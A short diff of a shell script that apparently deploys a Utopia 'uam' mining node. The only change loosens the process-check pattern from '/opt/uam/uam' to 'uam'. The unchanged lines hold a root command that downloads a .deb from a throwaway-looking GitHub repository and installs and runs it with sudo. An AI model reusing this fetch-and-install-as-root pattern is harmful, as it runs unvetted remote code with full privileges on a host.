@@ -218,7 +218,7 @@ run_tmux_with_retry() {
     local wait_seconds=15
     local retry_count=0
     echo "Starting the reinstallation of threads..."
-    while ! pgrep -f "/opt/uam/uam" > /dev/null && [ "$retry_count" -lt "$max_retries" ]; do
+    while ! pgrep -f "uam" > /dev/null && [ "$retry_count" -lt "$max_retries" ]; do
         # Start a new or attach to the existing tmux session
         sudo tmux has-session -t Utopia 2>/dev/null && sudo tmux kill-session -t Utopia
         sudo rm -f /root/miner.log
@@ -228,7 +228,7 @@ run_tmux_with_retry() {
         sudo tmux send-keys -t Utopia "PBKEY=$pbkey && cd /root && wget -O/root/uam.deb https://github.com/mahaliabpqvn07/temp-2/raw/main/uam-latest_amd64.deb && sudo dpkg -i uam.deb && /opt/uam/uam --pk \$PBKEY" Enter
         sleep $wait_seconds
         
-        if pgrep -f "/opt/uam/uam" > /dev/null; then
+        if pgrep -f "uam" > /dev/null; then
             return 0
         else
             echo "Tmux up failed"
